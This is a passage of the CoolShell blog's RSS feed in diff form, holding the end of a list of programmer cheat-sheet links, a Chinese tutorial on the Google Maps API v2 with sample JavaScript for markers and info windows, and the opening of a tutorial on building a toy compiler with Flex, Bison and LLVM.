+<li><a href="http://www.pixelbeat.org/vim.tips.html">Essential Vim keyboard shortcuts Cheat Sheet</a></li>
+<li><a href="http://tnerual.eriogerg.free.fr/vim.html">VIM Quick Reference Card</a></li>
+<li><a href="http://bullium.com/support/vim.html">Vim Commands Cheat Sheet</a></li>
+</ul>
+<p><strong>Weblog</strong></p>
+<ul>
+<li><a href="http://andywibbels.com/files/Blogger_Cheatsheet_v1.pdf">Blogger Cheatsheet — PDF</a></li>
+<li><a href="http://andywibbels.com/files/TypePad_Cheatsheet_v1.pdf">TypePad Cheatsheet — PDF</a></li>
+<li><a href="http://andywibbels.com/files/Movable_Type_Cheatsheet_v1.pdf">Movable Type Cheatsheet — PDF</a></li>
+<li><a href="http://www.einfach-persoenlich.de/2005-05-29/movabletype-movable-type-cheat-sheet-spickzettel.html">MovableType</a></li>
+<li><a href="http://andywibbels.com/files/WordPress_Cheatsheet_v1.pdf">WordPress Cheatsheet — PDF</a></li>
+<li><a href="http://bueltge.de/wp-wordpress-cheat-sheet-fuer-theme-tags-und-plugin-api/205">WP — WordPress Cheat Sheet f眉r Theme Tags und Plugin-API — PDF</a></li>
+</ul>
+<p><strong>Windows</strong></p>
+<ul>
+<li><a href="http://www.ss64.com/nt/">An A-Z Index of the Windows NT/XP command line</a></li>
+<li><a href="http://www.viemu.com/a_vi_vim_graphical_cheat_sheet_tutorial.html">Graphical vi-vim Cheat Sheet and Tutorial</a></li>
+<li><a href="http://www.fgcu.edu/support/office2000/ppt/shortcuts.html">Power Point 2000 — Keyboard Shortcuts</a></li>
+<li><a href="http://www.oreilly.com/examples/promos/pt/power_point_quickref.pdf">POWERPOINT 2003 — Quick Reference Card</a></li>
+<li><a href="http://www.gasmi.net/docs/tcp.html">TCP Ports list (3498 ports in list) </a></li>
+<li><a href="http://tlt.its.psu.edu/suggestions/international/accents/codealt.html">Windows — Alt Key Numeric Codes</a></li>
+</ul>
+<p><strong>XML</strong></p>
+<ul>
+<li><a href="http://www.dopefly.com/projects/fuseboxxmlcheatsheet.cfm">Fusebox 4.1 XML Cheat Sheet</a></li>
+<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_mathML_el_attr.pdf?title=MathML%3A+elements+-+attributes">MathML Reference — PDF</a></li>
+<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_voiceXML_el_attr.pdf?title=VoiceXML%3A+elements+-+attributes">VoiceXML Reference — PDF</a></li>
+<li><a href="http://refcards.com/download/bj/xtm-1.0.pdf">XML TopicMaps 1.0 — Quick Reference Card — PDF</a></li>
+<li><a href="http://www.mulberrytech.com/quickref/XMLquickref.pdf">XML Quick References — PDF</a></li>
+<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_xmlSchema2001_child_parent.pdf?title=XML+Schema+2001%3A+children+-+parents">XML Schema 2001: children — parents — PDF</a></li>
+<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_xmlSchema2001_el_attr.pdf?title=XML+Schema+2001%3A+elements+-+attributes">XML Schema 2001: elements — attributes — PDF</a></li>
+<li><a href="http://www.zvon.org/Output/cheatsheets/cheatsheet_list.html">XML Schema 2000/10 — PDF</a></li>
+<li><a href="http://www.xml.dvint.com/docs/SchemaStructuresQR-2.pdf">XML Schema — Structures Quick Reference — PDF</a></li>
+<li><a href="http://www.xml.dvint.com/docs/SchemaDataTypesQR-2.pdf">XML Schema — Data Types Quick Reference — PDF</a></li>
+<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_xslReference_el_attr.pdf?title=XSL+FO%3A+elements+-+attributes">XSL FO Reference — PDF</a></li>
+<li><a href="http://www.mulberrytech.com/quickref/XSLT_1quickref-v2.pdf">XSLT Quick References — PDF</a></li>
+<li><a href="http://refcards.com/download/deepx/XSLT-1.0.pdf">XSLT Quick Reference Card — PDF</a></li>
+<li><a href="http://www.topxml.com/xsl/XSLTRef.asp">XSLT Reference</a></li>
+</ul>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/5479.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/09/vim_cheat_sheet_for_programmers_print-150x150.png" alt="给程序员的VIM速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5479.html" class="wp_rp_title">给程序员的VIM速查卡</a></li><li ><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg" alt="Web开发人员速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a></li><li ><a href="https://coolshell.cn/articles/3480.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/01/OB-LP754_bestjo_D_20110104181820-150x150.jpg" alt="一些有意思的网站和贴子" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3480.html" class="wp_rp_title">一些有意思的网站和贴子</a></li><li ><a href="https://coolshell.cn/articles/2964.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="25个jQuery的编程小抄" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2964.html" class="wp_rp_title">25个jQuery的编程小抄</a></li><li ><a href="https://coolshell.cn/articles/2775.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/22.jpg" alt="免费电子书列表" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2775.html" class="wp_rp_title">免费电子书列表</a></li><li ><a href="https://coolshell.cn/articles/7992.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/cpp_small-150x150.jpg" alt="C++的坑真的多吗？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7992.html" class="wp_rp_title">C++的坑真的多吗？</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1566.html">程序员小抄大全</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1566.html/feed</wfw:commentRss>
+			<slash:comments>29</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Google Maps API用法教程</title>
+		<link>https://coolshell.cn/articles/1561.html</link>
+					<comments>https://coolshell.cn/articles/1561.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 13 Oct 2009 07:41:23 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[Google]]></category>
+		<category><![CDATA[Google Maps]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1561</guid>
+
+					<description><![CDATA[<p>在过去的一年中，在线地图的发展是相当巨大，我们可以看到在线地图的极有价值的信息和其能力。这其中，最有名气的自然是Google Maps。. Google Map...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1561.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1561.html">Google Maps API用法教程</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>在过去的一年中，在线地图的发展是相当巨大，我们可以看到在线地图的极有价值的信息和其能力。这其中，最有名气的自然是Google Maps。. Google Maps由一个相当强大的开发引擎并也有一个很大的社区提示支持。</p>
+<p>Google 允许各种web masters 通过Google Maps API来增加或自定义他们站点特定的地图，你可能从这里取得<a title="Get a Google Maps API Key" href="http://code.google.com/intl/en/apis/maps/signup.html" target="_blank">Google API key </a>。一个地图 API key只对一个“目录”或域有效。key绑定了你的域名，你要在网站上放地图，需要有对应的key，否则拒绝读取地图数据，在本地测试可以不用key。当然，你可以申请多个API key。</p>
+<h4>创建一个简单的地图</h4>
+<p>在你的站点上引入Google Maps 是一件很简单的事情，你只需要加入：</p>
+<p><span id="more-1561"></span></p>
+<ul>
+<li>引入Google的JavaScript 文件</li>
+<li>设置JavaScript 一些参数</li>
+<li>一个你需要显示地图的HTML layer</li>
+</ul>
+<p><strong>Google的Javascript文件引入</strong>:</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">
+&lt;script
+    charset=&quot;UTF-8&quot;
+    src=http://maps.google.com/maps?file=api&amp;v=2&amp;hl=en&amp;oe=utf-8&amp;key=API_KEY
+    type=&quot;text/javascript&quot;&gt;
+&lt;/script&gt;
+</pre>
+<p><em><strong>注意</strong>：</em> 我们可以改变语言，比如说，把“<strong>hl=en</strong>” 改成中文“<strong>hl=zh-CN</strong>” 。我们还得要把“<strong>API_KEY</strong>” 改成我们向Google申请来的那个。</p>
+<p><strong>说明</strong>: 使用 UTF-8 编码会更好些。</p>
+<p><strong>设置地图参数</strong>:</p>
+<p>这是你可定制有个性化的Google Maps的地方。我们可以增加一些参数来改变地图的样式。例如，我们可以设置地图的载入和显示的坐标。下面是相关的代码：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">]function initialize() {
+    if (GBrowserIsCompatible()) {
+        var map = new GMap2(document.getElementById(&quot;map_canvas&quot;));
+        map.setCenter(new GLatLng(37.97918, 23.71665), 13);
+        map.setUIToDefault();
+    }
+}</pre>
+<p>请注意上面高亮的那一条语句，第一个是纬度坐标和第二个是经度坐标，“13” 表示地图缩放的程度，这个值可以取1 到17。</p>
+<p>要知道所在地点的纬度和经度，你可以使用<a title="Tool to get the coordinates of a location" href="http://www.satsig.net/maps/lat-long-finder.htm" target="_blank">这个工具</a>，这个工具很容易使用，只需要把地图移到你想要的区域，然后，把鼠标放在中心就可以了。</p>
+<h4>地图标记</h4>
+<p>你可以在地图上放上一个标记来标出一个特定的位置，下面是一个示例代码。</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">var point = new GLatLng(37.97110, 23.72601);
+map.addOverlay(new GMarker(point));</pre>
+<p>于是，我们整个代码看起来是下面这个样子：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">function initialize() {
+    if (GBrowserIsCompatible()) {
+        var map = new GMap2(document.getElementById(&quot;map_canvas&quot;));
+        map.setCenter(new GLatLng(37.97918, 23.71665), 13);
+        var point = new GLatLng(37.97110, 23.72601);
+        map.addOverlay(new GMarker(point));
+        map.setUIToDefault();
+    }
+}</pre>
+<p>上面的示例把我们的地图的中心放在了希腊雅典，标记了雅典卫城。</p>
+<p><strong>气球提示</strong></p>
+<p>气球提示一个很不错的界面，他可以用于放置一些小提示或或是一些信息。例如，下面的代码将放置一个在雅典卫城山上放一个气球提示来显示一些信息：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">function initialize() {
+    if (GBrowserIsCompatible()) {
+        var map = new GMap2(document.getElementById(&quot;map_canvas&quot;));
+        map.setCenter(new GLatLng(37.97110, 23.72601), 13);
+        var html = &quot;Parthenon 帕台农神庙, 地址: Acropolis Hill&quot;;
+        map.openInfoWindow(map.getCenter(),
+        document.createTextNode(html));
+        map.setUIToDefault();
+    }
+}</pre>
+<h4>活动标记</h4>
+<p>我们可以合并一些标记和气球提示来创建一个活动标记，这样一来，我们可以达到这样的效果——当用户点击某个标记的时候才会显示提示。代码如下所示：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">function initialize() {
+    if (GBrowserIsCompatible()) {
+        var map = new GMap2(document.getElementById(&quot;map_canvas&quot;));
+        map.setCenter(new GLatLng(37.97918, 23.71665), 13);
+        var baseIcon = new GIcon(G_DEFAULT_ICON);
+        baseIcon.shadow = &quot;http://www.google.com/mapfiles/shadow50.png&quot;;
+        baseIcon.iconSize = new GSize(20, 34);
+        baseIcon.shadowSize = new GSize(37, 34);
+        baseIcon.iconAnchor = new GPoint(9, 34);
+        baseIcon.infoWindowAnchor = new GPoint(9, 2);
+
+        function createMarker(point, index) {
+            var redIcon = new GIcon(baseIcon);
+            redIcon.image = &quot;http://www.google.com/mapfiles/marker.png&quot;;
+            markerOptions = { icon:redIcon };
+            var marker = new GMarker(point, markerOptions);
+            GEvent.addListener(marker, &quot;click&quot;, function() {
+                marker.openInfoWindowHtml(&quot;Parthenon, Address: Acropolis Hill&quot;);
+            });
+            return marker;
+        }
+
+        var latlng = new GLatLng(37.97110, 23.72601);
+        map.addOverlay(createMarker(latlng));
+    }
+}</pre>
+<p>让我来梳理一下上面的代码。下面的部分是在标记下增加一个阴影：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">var baseIcon = new GIcon(G_DEFAULT_ICON);
+baseIcon.shadow = &quot;http://www.google.com/mapfiles/shadow50.png&quot;;
+baseIcon.iconSize = new GSize(20, 34);
+baseIcon.shadowSize = new GSize(37, 34);
+baseIcon.iconAnchor = new GPoint(9, 34);
+baseIcon.infoWindowAnchor = new GPoint(9, 2);</pre>
+<p>标记的Action是在这里设置的：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">function createMarker(point, index) {
+    var redIcon = new GIcon(baseIcon);
+    redIcon.image = &quot;http://www.google.com/mapfiles/marker.png&quot;;
+    markerOptions = { icon:redIcon };
+    var marker = new GMarker(point, markerOptions);
+    GEvent.addListener(marker, &quot;click&quot;, function() {
+        marker.openInfoWindowHtml(&quot;Parthenon, Address: Acropolis Hill&quot;);
+    });
+    return marker;
+}</pre>
+<p>这里是我们的标记的坐标：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">var latlng = new GLatLng(37.97110, 23.72601);
+map.addOverlay(createMarker(latlng));</pre>
+<h3>载入地图</h3>
+<p>我们可以通过两种方法载入地图。我们可以让地图在整网页载入时载入（通过使用body的load事件），也可以把载入过程赋给其它事件。下面的两个方法是我们需要注意的：</p>
+<ul>
+<li><strong>initialize()</strong> 载入地图</li>
+<li><strong>GUnload()</strong> 卸载地图以释放内存</li>
+</ul>
+<p>我们当然还需要使用HTML的DIV标签来指定一个ID，这样才能被JavaScript使用，在我们的示例中，我们使用“map_canvas”。我们也能使用CSS来渲染这个DIV层。</p>
+<h3>定制地图</h3>
+<p>你可以使用自定义的标记和阴影。有两个工具可以帮助你创建这些图标—— <a title="Custom Marker Icons" href="http://gmaps-utility-library.googlecode.com/svn/trunk/mapiconmaker/1.1/examples/markericonoptions-wizard.html" target="_blank">地图标记</a> 和<a title="Custom Shadows for Maps" href="http://www.cycloloco.com/shadowmaker/" target="_blank"> 阴影</a>。你也可以使用HTML和CSS来定义气球提示。</p>
+<h4>加入多个标记并分组</h4>
+<p>我们可以标记多个地点，并可以把它们根据我们的需要分组。这样一来，我们可以通过不同的标记图标来显示地点的不同属性，比如：酒店，车站等。要做到这样，我们只需要使用一个XML文件，一个简单的XML文件如下所示：</p>
+<pre data-enlighter-language="xml" class="EnlighterJSRAW">
+&lt;markers&gt;
+&lt;marker
+    name=&quot;标题&quot;
+    label=&quot;这是一个标签&quot;
+    desc=&quot;气球提示的描述&quot;
+    lat=&quot;37.97167&quot; lng=&quot;23.72581&quot;
+    type=&quot;标签的种类，如 Bridge&quot;
+    address=&quot;地址信息&quot;
+    icona=&quot;图标&quot;
+/&gt;
+&lt;/markers&gt;
+</pre>
+<p>你可以在这个XML文件中加入多个地点信息。有一件事你需要小心的是，当出现一一些特定字符时（比如单引号，双引号，<a href="mailto:“#@$">“#@$</a>&lt;&gt;”等），你需要使用HTML的转义。</p>
+<p>使用这XML的脚本如下：</p>
+<p><code data-enlighter-language="js" class="EnlighterJSRAW">&lt;script src=&quot;http://gmaps-utility-library.googlecode.com/svn/trunk/labeledmarker/release/src/labeledmarker.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</code></p>
+<p>当然，你需要设置一些参数：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">var iconRed = new GIcon();
+iconRed.image = &#039;../img/marker-red.png&#039;;
+iconRed.shadow = &#039;&#039;;
+iconRed.iconSize = new GSize(32, 32);
+iconRed.shadowSize = new GSize(22, 20);
+iconRed.iconAnchor = new GPoint(16, 16);
+iconRed.infoWindowAnchor = new GPoint(5, 1);
+var customIcons = [];
+
+customIcons[&quot;ancient&quot;] = iconRed;
+var markerGroups = { &quot;ancient&quot;: []};</pre>
+<p>上面，我们给customIcons 的“ancient”属性设置成了iconRed ，于是我们应该在我们的XML文件中使用类型(ancient) ，如果我们把这个XML文件命名为： markers.xml，那么，我们的代码如下：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">
+GDownloadUrl(&quot;markers.xml&quot;, function(data) { //We tell Google Maps to load our file
+        var xml = GXml.parse(data);
+        var markers = xml.documentElement.getElementsByTagName(&quot;marker&quot;); //and read markers
+        for (var i = 0; i &lt; markers.length; i++) {
+            var name = markers[i].getAttribute(&quot;name&quot;); //From here down we assign variables.
+            var label = markers[i].getAttribute(&quot;label&quot;);
+            var desc = markers[i].getAttribute(&quot;desc&quot;);
+            var address = markers[i].getAttribute(&quot;address&quot;);
+            var type = markers[i].getAttribute(&quot;type&quot;);
+            var icona = markers[i].getAttribute(&quot;icona&quot;);
+            var point = new GlatLng(parseFloat(markers[i].getAttribute(&quot;lat&quot;)), //and we set the lat-long
+            parseFloat(markers[i].getAttribute(&quot;lng&quot;)));
+            var marker = createMarker(point, name, label, desc, address, type, icona);
+            map.addOverlay(marker);
+        }
+    });
+}
+}
+
+function createMarker(point, name, label, desc, address, type, icona) {
+    var marker = new LabeledMarker(point, {icon: customIcons[type], labelText: label, labelOffset: new GSize(-6, -8)})
+};
+</pre>
+<p>要分组标记，你需要下面的代码：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">
+    markerGroups[type].push(marker);
+    var html = &quot;&lt;img src=&quot; + icona + &quot; height=150 border=0 /&gt;&lt;br&gt;&lt;br&gt;&lt;span&gt;&lt;b&gt;&quot;+ name + &quot;&lt;/b&gt;&lt;br/&gt;&quot; +
+            desc + &quot;&lt;br/&gt;&lt;b&gt;Address:&lt;/b&gt; &quot; + address + &quot;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&quot;;
+    GEvent.addListener(marker, &#039;click&#039;, function() {
+        marker.openInfoWindowHtml(html);
+    });
+    return marker;
+}
+</pre>
+<p>要使用不同的图标，你可以使用相同的方法。</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">var iconRed = new GIcon();
+iconRed.image = &#039;../img/marker-red.png&#039;;
+iconRed.shadow = &#039;&#039;;
+iconRed.iconSize = new GSize(32, 32);
+iconRed.shadowSize = new GSize(22, 20);
+iconRed.iconAnchor = new GPoint(16, 16);
+iconRed.infoWindowAnchor = new GPoint(5, 1);
+
+var iconGreen = new GIcon();
+iconGreen.image = &#039;../img/marker-green.png&#039;;
+iconGreen.shadow = &#039;&#039;;
+iconGreen.iconSize = new GSize(32, 32);
+iconGreen.shadowSize = new GSize(22, 20);
+iconGreen.iconAnchor = new GPoint(16, 16);
+iconGreen.infoWindowAnchor = new GPoint(5, 1);
+
+var iconBrown = new GIcon();
+iconBrown.image = &#039;../img/marker-brown.png&#039;;
+iconBrown.shadow = &#039;&#039;;
+iconBrown.iconSize = new GSize(32, 32);
+iconBrown.shadowSize = new GSize(22, 20);
+iconBrown.iconAnchor = new GPoint(16, 16);
+iconBrown.infoWindowAnchor = new GPoint(5, 1);
+
+var customIcons = [];
+
+customIcons[&quot;hotel&quot;] = iconRed;
+customIcons[&quot;bridge&quot;] = iconGreen;
+customIcons[&quot;hill&quot;] = iconBrown;
+var markerGroups = { &quot;hotel&quot;: [], &quot;bridge&quot;: [], &quot;hill&quot;: []};</pre>
+<p>所以，如果我们在XML 文件中设置了不同的种类，如：hotel，bridge 和 hill，我们也应该需要不同的颜色和图标。</p>
+<h4>过滤显示标记</h4>
+<p>我们还可以让我们的标记更友好一些。我们可以让用户决定是否显示标记，这样的话，地图上的标记就不会太多，也会根据用户的需求来显示相当的标记。我们可以使用几个按钮，复选框，或是链接来完成这个事情。要做到这个事，你需要在“<em>map.addMapType(G_SATELLITE_3D_MAP); </em>”后面加入下面的代码：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">document.getElementById(&quot;hotelCheckbox&quot;).checked = true;
+document.getElementById(&quot;bridgeCheckbox&quot;).checked = true;
+document.getElementById(&quot;hillCheckbox&quot;).checked = true;
+document.getElementById(&quot;labelsCheckbox&quot;).checked = true;
+</pre>
+<p>然后再加入下面的这些 JavaScript 的代码：</p>
+<pre data-enlighter-language="js" class="EnlighterJSRAW">
+function toggleGroup(type) {
+    for (var i = 0; i &lt; markerGroups[type].length; i++) {
+        var marker = markerGroups[type][i];
+        if (marker.isHidden()) {
+            marker.show();
+        } else {
+            marker.hide();
+        }
+    }
+}
+
+function toggleLabels() {
+    var showLabels = document.getElementById(&quot;labelsCheckbox&quot;).checked;
+    for (groupName in markerGroups) {
+        for (var i = 0; i &lt; markerGroups[groupName].length; i++) {
+            var marker = markerGroups[groupName][i];
+            marker.setLabelVisibility(showLabels);
+        }
+    }
+}
+
+function hideAll() {
+    var boxes = document.getElementsByName(&quot;mark&quot;);
+    for(var i = 0; i &lt; boxes.length; i++) {
+        if(boxes[i].checked) {
+            boxes[i].checked = false;
+            switchLayer(false, layers[i].obj);
+            chosen.push(i);
+        }
+    }
+}
+
+function checkChecked() {
+    var boxes = document.getElementsByName(&quot;mark&quot;);
+    for(var i = 0; i &lt; boxes.length; i++) {
+        if(boxes[i].checked) return true;
+    }
+    return false;
+}</pre>
+<p>最后一件事是加如几个checkbox ：</p>
+<pre data-enlighter-language="xml" class="EnlighterJSRAW">
+&lt;input type=&quot;hidden&quot; id=&quot;labelsCheckbox&quot; onclick=&quot;toggleLabels()&quot; checked=”checked” /&gt;
+&lt;label for=”hotelCheckbox”&gt;Hotels&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;hotelCheckbox&quot; onclick=&quot;toggleGroup(&#039;hotel&#039;)&quot; checked=”checked” /&gt;
+&lt;label for=”bridgeCheckbox”&gt;Bridges&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;bridgeCheckbox&quot; onclick=&quot;toggleGroup(&#039;bridge&#039;)&quot; checked=”checked” /&gt;
+</pre>
+<p>我们 Google Maps 就绪了，这篇文章讲述了Google Map API中你应该知道的。希望这篇文章对你有帮助。</p>
+<p>文章：<a href="http://jeez.eu/2009/10/09/google-maps-from-a-to-z/" target="_blank">来源</a><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22398.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2023/02/chatgpt-150x150.jpg" alt="我看ChatGPT: 为啥谷歌掉了千亿美金" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22398.html" class="wp_rp_title">我看ChatGPT: 为啥谷歌掉了千亿美金</a></li><li ><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/11/inbox2-640x264-150x150.jpg" alt="Google Inbox如何跨平台重用代码？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a></li><li ><a href="https://coolshell.cn/articles/9508.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/04/Google-Person-Finder-150x150.png" alt="PFIF网上寻人协议" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9508.html" class="wp_rp_title">PFIF网上寻人协议</a></li><li ><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/2.jpg" alt="来信， 创业 和 移动互联网" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_title">来信， 创业 和 移动互联网</a></li><li ><a href="https://coolshell.cn/articles/5701.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="SteveY对Amazon和Google平台的吐槽" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5701.html" class="wp_rp_title">SteveY对Amazon和Google平台的吐槽</a></li><li ><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/09/image008-150x150.jpg" alt="一些文章和各种资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_title">一些文章和各种资源</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1561.html">Google Maps API用法教程</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1561.html/feed</wfw:commentRss>
+			<slash:comments>6</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>使用Flex Bison 和LLVM编写自己的编译器</title>
+		<link>https://coolshell.cn/articles/1547.html</link>
+					<comments>https://coolshell.cn/articles/1547.html#comments</comments>
+		
+		<dc:creator><![CDATA[Neo]]></dc:creator>
+		<pubDate>Mon, 12 Oct 2009 04:47:18 +0000</pubDate>
+				<category><![CDATA[C/C++语言]]></category>
+		<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[编译原理]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1547</guid>
+
+					<description><![CDATA[<p>使用Flex Bison 和 LLVM编写你自己的编译器 原文出处：http://gnuu.org/2009/09/18/writing-your-own-to...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1547.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1547.html">使用Flex Bison 和LLVM编写自己的编译器</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><strong>使用Flex Bison 和 LLVM编写你自己的编译器</strong><br />
+原文出处：<a href="http://gnuu.org/2009/09/18/writing-your-own-toy-compiler/">http://gnuu.org/2009/09/18/writing-your-own-toy-compiler</a></p>
+<h2> 1、介绍</h2>
+<p>我总是对编译器和语言非常感兴趣，但是兴趣并不会让你走的更远。大量的编译器的设计概念可以搞的任何一个程序员迷失在这些概念之中。不用说，我也曾今尝试过，但是并没有取得太大的成功，我以前的尝试都停留在语义分析阶段。本文的灵感主要来源于我最近一次的尝试，并且在这一次中我取得一点成就。</p>
+<p>幸运的是，最近的几年，我参加了一些项目，这些项目给了我在建立编译器上很多有用的经验和观点。另外一件事是，我非常幸运得到<a href="http://llvm.org/">LLVM</a>的帮助。对于这个工具，我不知道改怎么去形容它，但是他给我的这个编译器的确带来非常大的帮助。<br />
+<span id="more-1547"></span></p>
+<h3>1.1、你为什么要阅读本文</h3>
+<p>你也许想看看我正在做的事情，但是更有可能的是，你也是和我一样对编译器和语言非常感兴趣，并且也可能遇到了一些在探索的过程中遇到了一些难题，你可能正打算解决这些难题，但是却没有发现好的资源。本文的目标就是提供这些资源，并以一种手把手的方式教你从头到尾的去创建一个具有基本功能的语言编译器。</p>
+<p>在本文，我不会去解释一些编译器基本理论，所以你要在开始本文前去了解什么是<a href="http://en.wikipedia.org/wiki/Backus%E2%80%93Naur_Form">BNF语法</a>，什么是<a href="http://en.wikipedia.org/wiki/Abstract_syntax_tree">抽象语法树数据结构 AST data structure</a>，什么是基础<a href="http://en.wikipedia.org/wiki/Compiler">编译器流水线 complier pipline</a>。就是说，我会把本文描述的尽量简单。本文的目的就是以一种简单易懂的方式来介绍相关编译器资源的方式来帮助那些从来没有编译器经验的人。</p>
+<h3>1.2、达到的成果</h3>
+<p>如果你根据文章内容一步步来，你将会得到一个能定义函数，调用函数，定义变量，给变量赋值执行基本数学操作的语言。这门语言支持两种基本类型，double和integer类型。还有一些功能还未实现，因此，你可以通过自己去实现这些功能得到你满意的功能并且能为你理解编写一个编译器提供不少的帮助。</p>
+<p><h3>1.3 问题解答</h3>
+</p>
+<h4>1.3.1 我需要了解什么样的语言</h4>
